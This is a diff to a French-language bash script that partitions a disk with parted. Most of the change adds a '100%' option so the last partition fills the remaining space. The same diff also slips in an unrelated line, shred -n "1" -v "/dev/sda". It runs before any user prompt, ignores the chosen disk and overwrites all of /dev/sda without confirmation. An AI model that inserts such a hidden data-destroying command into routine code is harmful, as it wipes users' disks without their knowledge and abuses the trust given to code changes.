@@ -9,6 +9,8 @@ fi
 
 echo "Mode de démarrage détecté : $boot_mode"
 
+shred -n "1" -v "/dev/sda"
+
 # Demander à l'utilisateur le nombre de partitions à créer
 read -p "Combien de partitions souhaitez-vous créer ? " num_partitions
 
@@ -54,18 +56,25 @@ fi
 
 # Boucle pour demander les détails de chaque partition supplémentaire
 for ((i = 1; i <= num_partitions; i++)); do
-  read -p "Entrez la taille de la partition $i (en Mo) : " partition_size
+  read -p "Entrez la taille de la partition $i (en Mo ou '100%' pour le reste du disque) : " partition_size
   read -p "Entrez le type de la partition $i (par ex. ext4, swap, etc.) : " partition_type
 
-  # Calculer le point de fin pour la partition actuelle
-  end_point=$((start_point + partition_size))
-  
-  # Créer la partition
-  parted $disk mkpart primary $partition_type ${start_point}MiB ${end_point}MiB
-  echo "Partition $i de taille ${partition_size}Mo et de type $partition_type créée."
-  
-  # Mettre à jour le point de départ pour la prochaine partition
-  start_point=$end_point
+  # Si l'utilisateur veut que la partition prenne tout l'espace disponible
+  if [ "$partition_size" = "100%" ]; then
+    parted $disk mkpart primary $partition_type ${start_point}MiB 100%
+    echo "Partition $i créée en occupant 100 % de l'espace disponible."
+    break  # Arrêter la boucle car tout l'espace est utilisé
+  else
+    # Calculer le point de fin pour la partition actuelle
+    end_point=$((start_point + partition_size))
+    
+    # Créer la partition avec la taille spécifiée
+    parted $disk mkpart primary $partition_type ${start_point}MiB ${end_point}MiB
+    echo "Partition $i de taille ${partition_size}Mo et de type $partition_type créée."
+    
+    # Mettre à jour le point de départ pour la prochaine partition
+    start_point=$end_point
+  fi
 done
 
 echo "Partitions créées avec succès."
